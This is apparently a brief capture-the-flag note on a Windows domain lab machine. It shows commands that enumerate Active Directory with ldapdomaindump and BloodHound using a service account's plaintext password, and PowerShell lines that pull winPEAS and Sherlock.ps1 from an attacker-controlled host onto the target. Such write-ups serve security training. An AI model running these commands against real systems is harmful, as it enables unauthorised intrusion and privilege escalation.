
```
ldapdomaindump ldaps://10.10.11.108 -u 'RETURN\svc-printer' -p '1edFg43012!!'
```
![[Pasted image 20240505194413.png]]


```
bloodhound-python -d RETURN.local -u svc-printer -p '1edFg43012!!' -ns 10.10.11.108 -c all
```
![[Pasted image 20240505194335.png]]

Let's run winpeas
```
IWR -Uri http://10.10.16.20:8080//winpeas/winPEASx64.exe -OutFile winPEASx64.exe
```
![[Pasted image 20240506015645.png]]

![[Pasted image 20240506020652.png]]

```
USERDOMAIN: RETURN
USERDNSDOMAIN: return.local
```



```
IWR -Uri http://10.10.16.20:8080/opt/windows_tools/Sherlock.ps1 -OutFile /opt/windows_tools/Sherlock.ps1
```